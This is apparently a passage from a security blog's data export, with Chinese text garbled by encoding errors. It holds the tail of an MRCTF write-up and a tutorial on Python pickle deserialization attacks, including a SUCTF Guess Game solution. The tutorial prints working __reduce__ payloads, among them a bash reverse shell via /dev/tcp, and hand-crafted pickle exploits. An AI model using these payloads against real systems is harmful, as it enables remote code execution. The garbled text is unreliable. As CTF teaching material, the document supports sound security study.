&quot;,end=&quot;&quot;) çˆ†ç ´å‡ºç§å­ä¸º1775196155 exp: 123456789101112131415161718192021&lt;?phpmt_srand(1775196155);function public_key($length = 16) &#123; $strings1 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;; $public_key = &#x27;&#x27;; for ( $i = 0; $i &lt; $length; $i++ ) $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1); return $public_key; &#125; //genarate private_key function private_key($length = 12) &#123; $strings2 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;; $private_key = &#x27;&#x27;; for ( $i = 0; $i &lt; $length; $i++ ) $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1); return $private_key; &#125; echo public_key().&quot;\\n&quot;; echo private_key().&quot;\\n&quot;; // XuNhoueCDCGc //$Public_key = KVQP0LdJKRaV3n9D how to get crispr&#x27;s private_key??? è¯•äº†è¯•index.phpæ²¡ååº”ï¼Œæºç å¯èƒ½æ˜¯ç™»é™†é¡µé¢ï¼Œlongin.phpè¿˜çœŸæœ‰ æ¥ç€å°±æ³¨å…¥æ‹¿flagäº† Ezpop_Revengdirsearchåˆæ‰«ä¸åˆ°www.zipï¼Œä¹Ÿä¸çŸ¥é“æ˜¯å•¥åŸå› ï¼Œæ¢dirmapäº†","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.m00nback.xyz/tags/writeup/"},{"name":"MRCTF","slug":"MRCTF","permalink":"http://www.m00nback.xyz/tags/MRCTF/"}]},{"title":"Pythonååºåˆ—åŒ–å­¦ä¹ ","slug":"Pythonååºåˆ—åŒ–å­¦ä¹ ","date":"2020-04-10T03:39:54.000Z","updated":"2020-04-13T00:05:45.175Z","comments":true,"path":"2020/04/10/Pythonååºåˆ—åŒ–å­¦ä¹ /","link":"","permalink":"http://www.m00nback.xyz/2020/04/10/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†Pythonååºåˆ—åŒ–çš„ç›¸å…³å†…å®¹ï¼","text":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†Pythonååºåˆ—åŒ–çš„ç›¸å…³å†…å®¹ï¼ å‰è¨€ä¸phpåºåˆ—åŒ–ååºåˆ—åŒ–ç±»ä¼¼ Pythonåºåˆ—åŒ–ï¼Œå°±æ˜¯æŠŠä¸€ä¸ªåœ¨å†…å­˜å½“ä¸­çš„pythonå¯¹è±¡é€šè¿‡æŸç§åè®®æˆ–è€…æ ‡å‡†ï¼Œè½¬æ¢æˆäºŒè¿›åˆ¶ç±»å‹çš„æ•°æ®ã€‚ Pythonååºåˆ—åŒ–ï¼Œæ˜¯ä¸€ä¸ªå®Œå…¨ç›¸åçš„è¿‡ç¨‹ï¼Œä»ç£ç›˜æ–‡ä»¶æˆ–è€…ç½‘ç»œä¸­è¯»å–åˆ°äºŒè¿›åˆ¶æ•°æ®ï¼Œå°†å®ƒä»¬è½¬æ¢æˆå†…å­˜ä¸­å¯æ“ä½œçš„å¯¹è±¡ï¼Œè¿™å°±æ˜¯ååºåˆ—åŒ–ã€‚ Pythonå®ç°åºåˆ—åŒ–æ–¹æ¡ˆï¼š pickle PyYAML XML json messagepack ä¸‹é¢ä¸»è¦ä»‹ç»pickleæ¨¡å—åºåˆ—åŒ–ä¸ååºåˆ—åŒ– pickleæ¨¡å—åºåˆ—åŒ–ï¼šä½¿ç”¨dumpsæˆ–è€…dumpæ–¹æ³• dumpsï¼šå°†å†…å­˜å¯¹è±¡åºåˆ—åŒ–ä¸ºå­—èŠ‚å¯¹è±¡ dumpï¼šå°†å†…å­˜å¯¹è±¡åºåˆ—åŒ–åˆ°æ–‡ä»¶å¯¹è±¡(å­˜å…¥æ–‡ä»¶) ååºåˆ—åŒ–ï¼šä½¿ç”¨loadså’Œloadæ–¹æ³• loadsï¼šå°† å­—èŠ‚å¯¹è±¡ååºåˆ—åŒ–ä¸ºå†…å­˜å¯¹è±¡ loadï¼šä»æ–‡ä»¶å¯¹è±¡ååºåˆ—åŒ–ä¸ºå†…å­˜å¯¹è±¡ ä¸¾ä¸ªä¾‹å­ï¼š 123456789101112import pickleclass People(): def __init__(self,name = &quot;MoonBack&quot;): self.name = name def __str__(self): return &quot;Hello World!&quot;a=People()print(pickle.dumps(a))print(pickle.loads(pickle.dumps(a))) __str__ç±»ä¼¼äºjavaä¸­çš„toStringæ–¹æ³•ï¼Œå³è¿”å›å¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨ç¤º 1b&#x27;\\x80\\x03c__main__\\nPeople\\nq\\x00)\\x81q\\x01&#125;q\\x02X\\x04\\x00\\x00\\x00nameq\\x03X\\x08\\x00\\x00\\x00MoonBackq\\x04sb.&#x27; è¿™ä¹ˆé•¿çš„ä¸€ä¸²æ˜¯å•¥æ„æ€å‘¢ï¼Ÿæ…¢æ…¢æ¥è¯´ pickleæŒ‡ä»¤ç pickle.loads()å‡½æ•°æ˜¯æˆ‘ä»¬ç”¨æ¥ååºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡çš„ä¸€ä¸ªæ¥å£ï¼Œåº•å±‚å®ç°æ˜¯åŸºäº_Unpicklerç±» _Unpicklerç±»ç»´æŠ¤äº†ä¸¤ä¸ªä¸œè¥¿ï¼šæ ˆåŒºå’Œå­˜å‚¨åŒºã€‚ç»“æ„å¦‚ä¸‹å›¾ï¼š æ ˆæ˜¯unpickleæœºæœ€æ ¸å¿ƒçš„æ•°æ®ç»“æ„ï¼Œæ‰€æœ‰çš„æ•°æ®æ“ä½œå‡ ä¹éƒ½åœ¨æ ˆä¸Šã€‚ä¸ºäº†åº”å¯¹æ•°æ®åµŒå¥—ï¼Œæ ˆåŒºåˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼šå½“å‰æ ˆä¸“æ³¨äºç»´æŠ¤æœ€é¡¶å±‚çš„ä¿¡æ¯ï¼Œæœ€ç»ˆç•™åœ¨æ ˆé¡¶çš„å€¼å°†è¢«ä½œä¸ºååºåˆ—åŒ–å¯¹è±¡è¿”å›ï¼Œæœ‰çš„è¿™éƒ¨åˆ†åšå®¢ä¸Šå†™çš„æ˜¯æŒ‡ä»¤å¤„ç†å™¨ï¼Œè€Œå‰åºæ ˆç»´æŠ¤ä¸‹å±‚çš„ä¿¡æ¯ï¼Œç”¨æ¥ä¸´æ—¶å­˜å‚¨æ•°æ®ã€å‚æ•°ä»¥åŠå¯¹è±¡ã€‚ å­˜å‚¨åŒºå¯ä»¥ç±»æ¯”å†…å­˜ï¼Œç”¨äºå­˜å–å˜é‡ã€‚å®ƒæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œä»¥ä¸‹æ ‡ä¸ºç´¢å¼•ã€‚å®ƒçš„æ¯ä¸€ä¸ªå•å…ƒå¯ä»¥ç”¨æ¥å­˜å‚¨ä»»ä½•ä¸œè¥¿ï¼Œå¤§å¤šæ•°æƒ…å†µä¸‹æˆ‘ä»¬å¹¶ä¸éœ€è¦è¿™ä¸ªå­˜å‚¨åŒº çœ‹äº†å…¶ä»–äººå†™çš„åšå®¢ï¼Œå‘ç°å¯¹è¿™ä¸‰ä¸ªåç§°å«æ³•ä¸å°½ç›¸åŒï¼Œä½†è¡¨è¾¾çš„æ„æ€åŸºæœ¬ç›¸ä¼¼ï¼Œå°±è¿™æ ·ç†è§£å§ï¼ ä¸ºäº†çœ‹çš„æ›´æ¸…æ™°ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨Pythonæä¾›çš„pickleè°ƒè¯•å™¨æ¨¡å—pickletools 123456789101112import pickleimport pickletoolsclass People(): def __init__(self,name = &quot;MoonBack&quot;): self.name = name def __str__(self): return &quot;Hello World!&quot;a=People()pickletools.dis(pickle.dumps(a)) å…¶å®å°±æ˜¯åºåˆ—åŒ–ç»“æœçš„æ¯”è¾ƒå®¹æ˜“ç†è§£çš„å½¢å¼ï¼Œçœ‹ç€å’Œæ±‡ç¼–ä»£ç å¾ˆåƒï¼Œåœ¨ç»“æœé‡Œé¢æ¯ä¸€è¡Œå°±æ˜¯ä¸€ä¸ªæŒ‡ä»¤ç ã€‚ è¿™äº›æŒ‡ä»¤è¯´æ˜ï¼Œå…¨æ˜¯è‹±æ–‡å°±å¾ˆéš¾å—ï¼Œå®åœ¨æ‰¾ä¸åˆ°å°±ç¿»è¯‘ 1234567891011121314151617181920212223242526272829303132333435363738394041424344MARK = b&#x27;(&#x27; # push special markobject on stackSTOP = b&#x27;.&#x27; # every pickle ends with STOPPOP = b&#x27;0&#x27; # discard topmost stack itemPOP_MARK = b&#x27;1&#x27; # discard stack top through topmost markobjectDUP = b&#x27;2&#x27; # duplicate top stack itemFLOAT = b&#x27;F&#x27; # push float object; decimal string argumentINT = b&#x27;I&#x27; # push integer or bool; decimal string argumentBININT = b&#x27;J&#x27; # push four-byte signed intBININT1 = b&#x27;K&#x27; # push 1-byte unsigned intLONG = b&#x27;L&#x27; # push long; decimal string argumentBININT2 = b&#x27;M&#x27; # push 2-byte unsigned intNONE = b&#x27;N&#x27; # push NonePERSID = b&#x27;P&#x27; # push persistent object; id is taken from string argBINPERSID = b&#x27;Q&#x27; # &quot; &quot; &quot; ; &quot; &quot; &quot; &quot; stackREDUCE = b&#x27;R&#x27; # apply callable to argtuple, both on stackSTRING = b&#x27;S&#x27; # push string; NL-terminated string argumentBINSTRING = b&#x27;T&#x27; # push string; counted binary string argumentSHORT_BINSTRING= b&#x27;U&#x27; # &quot; &quot; ; &quot; &quot; &quot; &quot; &lt; 256 bytesUNICODE = b&#x27;V&#x27; # push Unicode string; raw-unicode-escaped&#x27;d argumentBINUNICODE = b&#x27;X&#x27; # &quot; &quot; &quot; ; counted UTF-8 string argumentAPPEND = b&#x27;a&#x27; # append stack top to list below itBUILD = b&#x27;b&#x27; # call __setstate__ or __dict__.update()GLOBAL = b&#x27;c&#x27; # push self.find_class(modname, name); 2 string argsDICT = b&#x27;d&#x27; # build a dict from stack itemsEMPTY_DICT = b&#x27;&#125;&#x27; # push empty dictAPPENDS = b&#x27;e&#x27; # extend list on stack by topmost stack sliceGET = b&#x27;g&#x27; # push item from memo on stack; index is string argBINGET = b&#x27;h&#x27; # &quot; &quot; &quot; &quot; &quot; &quot; ; &quot; &quot; 1-byte argINST = b&#x27;i&#x27; # build &amp; push class instanceLONG_BINGET = b&#x27;j&#x27; # push item from memo on stack; index is 4-byte argLIST = b&#x27;l&#x27; # build list from topmost stack itemsEMPTY_LIST = b&#x27;]&#x27; # push empty listOBJ = b&#x27;o&#x27; # build &amp; push class instancePUT = b&#x27;p&#x27; # store stack top in memo; index is string argBINPUT = b&#x27;q&#x27; # &quot; &quot; &quot; &quot; &quot; ; &quot; &quot; 1-byte argLONG_BINPUT = b&#x27;r&#x27; # &quot; &quot; &quot; &quot; &quot; ; &quot; &quot; 4-byte argSETITEM = b&#x27;s&#x27; # add key+value pair to dictTUPLE = b&#x27;t&#x27; # build tuple from topmost stack itemsEMPTY_TUPLE = b&#x27;)&#x27; # push empty tupleSETITEMS = b&#x27;u&#x27; # modify dict by adding topmost key+value pairsBINFLOAT = b&#x27;G&#x27; # push float; arg is 8-byte float encodingâ€‹TRUE = b&#x27;I01\\n&#x27; # not an opcode; see INT docs in pickletools.pyFALSE = b&#x27;I00\\n&#x27; # not an opcode; see INT docs in pickletools.py å½“å‰ç”¨äº pickling çš„åè®®å…±æœ‰ 5 ç§ã€‚ä½¿ç”¨çš„åè®®ç‰ˆæœ¬è¶Šé«˜ï¼Œè¯»å–ç”Ÿæˆçš„ pickle æ‰€éœ€çš„ Python ç‰ˆæœ¬å°±è¦è¶Šæ–°ã€‚ v0 ç‰ˆåè®®æ˜¯åŸå§‹çš„ â€œäººç±»å¯è¯»â€ åè®®ï¼Œå¹¶ä¸”å‘åå…¼å®¹æ—©æœŸç‰ˆæœ¬çš„ Pythonã€‚ v1 ç‰ˆåè®®æ˜¯è¾ƒæ—©çš„äºŒè¿›åˆ¶æ ¼å¼ï¼Œå®ƒä¹Ÿä¸æ—©æœŸç‰ˆæœ¬çš„ Python å…¼å®¹ã€‚ v2 ç‰ˆåè®®æ˜¯åœ¨ Python 2.3 ä¸­å¼•å…¥çš„ã€‚å®ƒä¸ºå­˜å‚¨ new-style class æä¾›äº†æ›´é«˜æ•ˆçš„æœºåˆ¶ã€‚æ¬²äº†è§£æœ‰å…³ç¬¬ 2 ç‰ˆåè®®å¸¦æ¥çš„æ”¹è¿›ï¼Œè¯·å‚é˜… PEP 307ã€‚ v3 ç‰ˆåè®®æ·»åŠ äº Python 3.0ã€‚å®ƒå…·æœ‰å¯¹ bytes å¯¹è±¡çš„æ˜¾å¼æ”¯æŒï¼Œä¸”æ— æ³•è¢« Python 2.x æ‰“å¼€ã€‚è¿™æ˜¯ç›®å‰é»˜è®¤ä½¿ç”¨çš„åè®®ï¼Œä¹Ÿæ˜¯åœ¨è¦æ±‚ä¸å…¶ä»– Python 3 ç‰ˆæœ¬å…¼å®¹æ—¶çš„æ¨èåè®®ã€‚ v4 ç‰ˆåè®®æ·»åŠ äº Python 3.4ã€‚å®ƒæ”¯æŒå­˜å‚¨éå¸¸å¤§çš„å¯¹è±¡ï¼Œèƒ½å­˜å‚¨æ›´å¤šç§ç±»çš„å¯¹è±¡ï¼Œè¿˜åŒ…æ‹¬ä¸€äº›é’ˆå¯¹æ•°æ®æ ¼å¼çš„ä¼˜åŒ–ã€‚æœ‰å…³ç¬¬ 4 ç‰ˆåè®®å¸¦æ¥æ”¹è¿›çš„ä¿¡æ¯ï¼Œè¯·å‚é˜… PEP 3154ã€‚ 0å·ç‰ˆæœ¬æ˜¯äººç±»æœ€å¯è¯»çš„ï¼›ä¹‹åçš„ç‰ˆæœ¬åŠ å…¥äº†ä¸€å¤§å †ä¸å¯æ‰“å°å­—ç¬¦ï¼Œä¸è¿‡è¿™äº›æ–°åŠ çš„ä¸œè¥¿éƒ½åªæ˜¯ä¸ºäº†ä¼˜åŒ–ï¼Œæœ¬è´¨ä¸Šæ²¡æœ‰å¤ªå¤§çš„æ”¹åŠ¨ã€‚ ä¸€ä¸ªå¥½æ¶ˆæ¯æ˜¯ï¼Œpickleåè®®æ˜¯å‘å‰å…¼å®¹çš„ã€‚0å·ç‰ˆæœ¬çš„å­—ç¬¦ä¸²å¯ä»¥ç›´æ¥äº¤ç»™pickle.loads()ï¼Œä¸ç”¨æ‹…å¿ƒå¼•å‘ä»€ä¹ˆæ„å¤–ã€‚ æŠ˜ç£¨å¤šå¥½åƒæ²¡å•¥ç”¨ï¼Œä»‹ç»å‡ ä¸ªå¸¸ç”¨çš„æŒ‡ä»¤ç ï¼š S : åé¢è·Ÿçš„æ˜¯å­—ç¬¦ä¸² Iï¼šåé¢è·Ÿçš„æ˜¯æ•´å½¢ sï¼šæ·»åŠ é”®å€¼å¯¹åˆ°å­—å…¸ ( ï¼šå‹å…¥ä¸€ä¸ªæ ‡å¿—åˆ°æ ˆä¸­ï¼Œè¡¨ç¤ºå…ƒç»„çš„å¼€å§‹ä½ç½® t ï¼šä»æ ˆé¡¶å¼€å§‹ï¼Œæ‰¾åˆ°æœ€ä¸Šé¢çš„ä¸€ä¸ª(ï¼Œå¹¶å°†(åˆ°tä¸­é—´çš„å†…å®¹å…¨éƒ¨å¼¹å‡ºï¼Œç»„æˆä¸€ä¸ªå…ƒç»„ï¼Œå†æŠŠè¿™ä¸ªå…ƒç»„å‹å…¥æ ˆä¸­ c ï¼šå¼•å…¥æ¨¡å—åå’Œç±»åï¼ˆæ¨¡å—åå’Œç±»åä¹‹é—´ä½¿ç”¨å›è½¦åˆ†éš”ï¼Œfind_classæ ¡éªŒå°±åœ¨è¿™ä¸€æ­¥ï¼‰ R ï¼šä»æ ˆé¡¶å¼¹å‡ºä¸€ä¸ªå¯æ‰§è¡Œå¯¹è±¡å’Œä¸€ä¸ªå…ƒç»„ï¼Œå…ƒç»„ä½œä¸ºå‡½æ•°çš„å‚æ•°åˆ—è¡¨æ‰§è¡Œï¼Œå¹¶å°†è¿”å›å€¼å‹å…¥æ ˆä¸Š . ï¼šç‚¹å·æ˜¯ç»“æŸç¬¦ }ï¼špushä¸€ä¸ªç©ºçš„å­—å…¸ ååºåˆ—åŒ–è¿‡ç¨‹ï¼šhttps://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf æ‰‹å†™æŒ‡ä»¤ç ï¼š åŸºæœ¬æ¨¡å¼ï¼š 1234c&lt;module&gt;&lt;callable&gt;(&lt;args&gt;tR çœ‹ä¸ªå°ä¾‹å­ï¼š 12345678910111213141516cossystem(S&#x27;ls&#x27;tR.&lt;=&gt; __import__(&#x27;os&#x27;).system(*(&#x27;ls&#x27;,))# åˆ†è§£ä¸€ä¸‹ï¼šcossystem =&gt; å¼•å…¥ systemï¼Œå¹¶å°†å‡½æ•°æ·»åŠ åˆ° stack(S&#x27;ls&#x27; =&gt; æŠŠå½“å‰ stack å­˜åˆ° metastackï¼Œæ¸…ç©º stackï¼Œå†å°† &#x27;ls&#x27; å‹å…¥ stackt =&gt; stack ä¸­çš„å€¼å¼¹å‡ºå¹¶è½¬ä¸º tupleï¼ŒæŠŠ metastack è¿˜åŸåˆ° stackï¼Œå†å°† tuple å‹å…¥ stack# ç®€å•æ¥è¯´ï¼Œ(,t ä¹‹é—´çš„å†…å®¹å½¢æˆäº†ä¸€ä¸ª tupleï¼Œstack ç›®å‰æ˜¯ [&lt;built-in function system&gt;, (&#x27;ls&#x27;,)]R =&gt; system(*(&#x27;ls&#x27;,)). =&gt; ç»“æŸï¼Œè¿”å›å½“å‰æ ˆé¡¶å…ƒç´  __reduce__æ–¹æ³•è¯¥æ–¹æ³•åœ¨ååºåˆ—åŒ–æ—¶è‡ªåŠ¨è°ƒç”¨ å¦‚æœè¿”å›å€¼æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆå°†ä¼šå»å½“å‰ä½œç”¨åŸŸä¸­æŸ¥æ‰¾å­—ç¬¦ä¸²å€¼å¯¹åº”åå­—çš„å¯¹è±¡ï¼Œå°†å…¶åºåˆ—åŒ–ä¹‹åè¿”å›ï¼Œä¾‹å¦‚æœ€åreturn &#39;a&#39;,é‚£ä¹ˆå®ƒå°±ä¼šåœ¨å½“å‰çš„ä½œç”¨åŸŸä¸­å¯»æ‰¾åä¸ºaçš„å¯¹è±¡ç„¶åè¿”å›ï¼Œå¦åˆ™æŠ¥é”™ã€‚ å¦‚æœè¿”å›å€¼æ˜¯ä¸€ä¸ªå…ƒç»„ï¼Œè¦æ±‚æ˜¯2åˆ°5ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¯è°ƒç”¨çš„å¯¹è±¡ï¼Œç¬¬äºŒä¸ªæ˜¯è¯¥å¯¹è±¡æ‰€éœ€çš„å‚æ•°å…ƒç»„ï¼Œå‰©ä¸‹ä¸‰ä¸ªå¯é€‰ã€‚æ‰€ä»¥æ¯”å¦‚æœ€åreturn (eval,(&quot;os.system(&#39;ls&#39;)&quot;,))ï¼Œé‚£ä¹ˆå°±æ˜¯æ‰§è¡Œevalå‡½æ•°ï¼Œç„¶åå…ƒç»„å†…çš„å€¼ä½œä¸ºå‚æ•°ï¼Œä»è€Œè¾¾åˆ°æ‰§è¡Œå‘½ä»¤æˆ–ä»£ç çš„ç›®çš„ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥return (os.system,(&#39;ls&#39;,))ã€‚ ç”±æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ å¦‚ä¸‹çš„exp: 12345678910import osimport pickleclass test(): def __reduce__(self): return (os.system,(&#x27;whoami&#x27;,))a=test()c=pickle.dumps(a)print(c) ç„¶åæˆ‘ä»¬æ— éœ€å¯¼å…¥osæ¨¡å—ï¼Œæ— éœ€æœ‰testç±»ï¼Œå°±èƒ½ä»£ç æ‰§è¡Œ åŒæ ·ï¼Œå¼¹shellä¹‹ç±»çš„ä¹Ÿä¸åœ¨è¯ä¸‹ 12345678910import osimport pickleclass test(): def __reduce__(self): code=&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1&quot;&#x27; return (os.system,(code,))a=test()c=pickle.dumps(a)print(c)pickle.loads(c) __reduce__æ–¹æ³•æ˜¯æ–°å¼ç±»(å†…ç½®ç±»)ç‰¹æœ‰çš„ï¼Œåœ¨python2ä¸­è¦æ³¨æ„ç»§æ‰¿objectç±» çœŸå®æ¡ˆä¾‹Pç¥çš„æ“ä½œï¼šhttps://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html Redisæœªæˆæƒè®¿é—®+Pythonååºåˆ—åŒ– CTFé¢˜ç›®[SUCTF 2019]Guess Gameé¢˜ç›®åœ°å€ï¼šhttps://github.com/team-su/SUCTF-2019/tree/master/Misc/guess_game buuä¸Šæœ‰ç¯å¢ƒï¼Œåˆ—ä¸‹å…³é”®çš„æºç ï¼š game_client.py 12345678910111213141516171819202122232425262728293031import asyncioimport picklefrom guess_game.Ticket import Ticketfrom guess_game import bannerfrom struct import packdef pack_length(obj): return pack(&#x27;&gt;I&#x27;, obj)async def start_client(host, port): reader, writer = await asyncio.open_connection(host, port) print(banner) for _ in range(10): number = &#x27;&#x27; while number == &#x27;&#x27;: try: number = input(&#x27;Input the number you guess\\n&gt; &#x27;) number = int(number) except ValueError: number = &#x27;&#x27; pass ticket = Ticket(number) ticket = pickle.dumps(ticket) writer.write(pack_length(len(ticket))) writer.write(ticket) response = await reader.readline() print(response.decode()) response = await reader.readline() print(response.decode())loop = asyncio.get_event_loop()loop.run_until_complete(start_client(&#x27;node3.buuoj.cn&#x27;, 27628)) ä¸Šé¢çš„ä»£ç çš„æ„æ€å°±æ˜¯è¿›è¡Œ10æ¬¡çŒœæ•°ï¼Œåºåˆ—åŒ–å¹¶ç¼–ç ä¼ è¾“åˆ°æœåŠ¡ç«¯ game_server.py 1234567891011121314151617181920212223242526272829303132333435363738394041from guess_game.Ticket import Ticketfrom guess_game.RestrictedUnpickler import restricted_loadsfrom struct import unpackfrom guess_game import gameimport sysdef get_flag(): with open(&#x27;/flag&#x27;, &#x27;r&#x27;) as f: flag = f.read().strip() return flagdef read_length(obj): return unpack(&#x27;&gt;I&#x27;, obj)def stdin_read(length): return sys.stdin.buffer.read(length)try: while not game.finished(): length = stdin_read(4) length, = read_length(length) ticket = stdin_read(length) ticket = restricted_loads(ticket) # è°ƒç”¨RestrictedUnpickler.restricted_loads()æ–¹æ³• assert type(ticket) == Ticket if not ticket.is_valid(): print(&#x27;The number is invalid.&#x27;) game.next_game(Ticket(-1)) continue win = game.next_game(ticket) if win: text = &quot;Congratulations, you get the right number!&quot; else: text = &quot;Wrong number, better luck next time.&quot; print(text) if game.is_win(): text = &quot;Game over! You win all the rounds, here is your flag %s&quot; % get_flag() else: text = &quot;Game over! You got %d/%d.&quot; % (game.win_count, game.round_count) print(text)except Exception: print(&#x27;Houston, we got a problem.&#x27;) è¿™æ®µä»£ç æ˜¯æœåŠ¡ç«¯çš„ï¼Œæ¥æ”¶ä¼ è¿‡æ¥çš„æ•°æ®å¹¶ååºåˆ—åŒ–ï¼Œåˆ¤æ–­ååºåˆ—åŒ–çš„ç»“æœæ˜¯ä¸æ˜¯Ticketç±»ï¼Œæ˜¯çš„è¯æ‰ä¼šæ¥ç€æ‰§è¡Œï¼Œgame.is_win()æˆç«‹æ‰ä¼šç»™flag RestrictedUnpickler.py 123456789101112131415import ioimport pickleimport sysclass RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): # Only allow safe classes if &quot;guess_game&quot; == module[0:10] and &quot;__&quot; not in name: return getattr(sys.modules[module], name) # Forbid everything else. raise pickle.UnpicklingError(&quot;global &#x27;%s.%s&#x27; is forbidden&quot; % (module, name))def restricted_loads(s): &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot; return RestrictedUnpickler(io.BytesIO(s)).load() è¿™æ®µä»£ç çš„ä»‹ç»å‚è€ƒï¼šhttps://docs.python.org/zh-cn/3/library/pickle.html?highlight=__reduce#restricting-globals å¤§æ¦‚æ„æ€å°±æ˜¯ï¼Œä¸ºäº†é˜²æ­¢pickleååºåˆ—åŒ–çš„å±å®³ï¼Œå¯ä»¥ç»§æ‰¿pickle.Unpicklerå®ç°find_classæ–¹æ³•ä»è€Œè¾¾åˆ°è¿‡æ»¤éƒ¨åˆ†æ¨¡å—æ–¹æ³•çš„ç›®çš„ï¼Œè¯¥æ–¹æ³•åœ¨ä½¿ç”¨è¯¥ç±»æ—¶è‡ªåŠ¨è°ƒç”¨ã€‚ è€Œåœ¨è¯¥é¢˜ä¸­ï¼Œå¿…é¡»æœ‰guess_gameé‡Œçš„ç±»ï¼Œè€Œä¸”è¿‡æ»¤äº†__ï¼Œ__reduce__é‚£ç§æ–¹æ³•æ˜¾ç„¶ä¸èƒ½ç”¨äº† çœ‹ä¸‹Game.pyï¼š 1234567891011121314151617181920212223242526from random import randintfrom guess_game.Ticket import Ticketfrom guess_game import max_round, number_range# max_roundä»£è¡¨å›åˆ number_rangeä»£è¡¨æœ€å¤§æ•°class Game: def __init__(self): number = randint(0, number_range) self.curr_ticket = Ticket(number) self.round_count = 0 self.win_count = 0 def next_game(self, ticket): win = False if self.curr_ticket == ticket: self.win_count += 1 win = True number = randint(0, number_range) self.curr_ticket = Ticket(number) self.round_count += 1 return win def finished(self): return self.round_count &gt;= max_round def is_win(self): return self.win_count == max_round åœ¨__init__.py: 123456max_round = 10number_range = 10from guess_game.Game import Gamegame = Game() è¿™é‡Œè™½ç„¶æ¡ä»¶å—é™, åªèƒ½åŠ è½½æŒ‡å®šæ¨¡å—, ä½†æ˜¯å¯ä»¥çœ‹åˆ° __init.py__ ä¸­ game = Game(), æ‰€ä»¥åªè¦æ„é€ å‡º pickle ä»£ç è·å¾— guess_game.gameå¯¹è±¡, ç„¶åä¿®æ”¹ game çš„ win_count å’Œ round_count å³å¯.æ³¨æ„è¿™é‡Œå¿…é¡»æ‰‹å†™, å¦‚æœæ˜¯ from guess_game import game, ç„¶åä¿®æ”¹å† dumps è¿™ä¸ª game çš„è¯, æ˜¯åœ¨è¿è¡Œæ—¶é‡æ–°æ–°å»ºä¸€ä¸ª Game å¯¹è±¡, è€Œä¸æ˜¯ä» guess_game è¿™ä¸ª module é‡Œé¢è·å–ã€‚ exp: 123456789101112131415161718import socketimport structs = socket.socket()s.connect((&#x27;node3.buuoj.cn&#x27;, 29935))exp = b&#x27;&#x27;&#x27;cguess_gamegame&#125;S&quot;win_count&quot;I10sS&quot;round_count&quot;I10sbcguess_game.Ticket\\nTicket\\nq\\x00)\\x81q\\x01&#125;q\\x02X\\x06\\x00\\x00\\x00numberq\\x03K\\x03sb.&#x27;&#x27;&#x27;s.send(struct.pack(&#x27;&gt;I&#x27;, len(exp)))s.send(exp)print(s.recv(1024))print(s.recv(1024))print(s.recv(1024))print(s.recv(1024)) åˆ†æä¸€ä¸‹æ„é€ è¿‡ç¨‹ 1234567cguess_gamegame # å¼•å…¥guess_game.gameç±»&#125;S&#x27;round_count&#x27; # pushä¸€ä¸ªç©ºçš„å­—å…¸ï¼ŒæŠŠround_countå’Œwin_countåŠ åˆ°é‡Œé¢I10sS&#x27;win_count&#x27;I10sbcguess_game.Ticket\\nTicket\\nq\\x00)\\x81q\\x01&#125;q\\x02X\\x06\\x00\\x00\\x00numberq\\x03K\\xffsb. æœ€åä¸€è¡Œå‰ä¸¤ä¸ªå­—æ¯è¡¨ç¤ºå¯¹è±¡æ›´æ–°ï¼Œåé¢ä¸€ä¸²æ˜¯guess_game.Ticketå¯¹è±¡åºåˆ—åŒ–çš„ç»“æœï¼Œpickle åºåˆ—æµæ‰§è¡Œå®Œåä¼šæŠŠæ ˆé¡¶çš„å€¼è¿”å›ï¼Œé‚£ç»“å°¾å†ç•™ä¸€ä¸ª Ticket çš„å¯¹è±¡å°±è¡Œäº† 12345678910111213141516171819202122232425262728293031from guess_game.Ticket import Ticketfrom guess_game.Game import Gameimport pickleexp = b&#x27;&#x27;&#x27;cguess_gamegame&#125;S&quot;win_count&quot;I10sS&quot;round_count&quot;I10sb\\x80\\x03cguess_game.Ticket\\nTicket\\nq\\x00)\\x81q\\x01&#125;q\\x02X\\x06\\x00\\x00\\x00numberq\\x03K\\x03sb.&#x27;&#x27;&#x27;exp1 = b&#x27;&#x27;&#x27;cguess_gamegame&#125;S&quot;win_count&quot;I10sS&quot;round_count&quot;I10sb.&#x27;&#x27;&#x27;a=Ticket(3)print(pickle.dumps(a))# b&#x27;\\x80\\x03cguess_game.Ticket\\nTicket\\nq\\x00)\\x81q\\x01&#125;q\\x02X\\x06\\x00\\x00\\x00numberq\\x03K\\x03sb.&#x27;b=pickle.loads(exp)print(b)# &lt;guess_game.Ticket.Ticket object at 0x7f9370b61a90&gt;print(b.__dict__)# &#123;&#x27;number&#x27;: 3&#125;c=pickle.loads(exp1)print(c)# &lt;guess_game.Game.Game object at 0x7f9370b50eb8&gt;print(c.__dict__)# &#123;&#x27;win_count&#x27;: 10, &#x27;curr_ticket&#x27;: &lt;guess_game.Ticket.Ticket object at 0x7f9370b50f60&gt;, &#x27;round_count&#x27;: 10&#125; å‚è€ƒï¼š https://www.xjimmy.com/python-36-serialization.html https://zhuanlan.zhihu.com/p/89132768 https://www.anquanke.com/post/id/188981 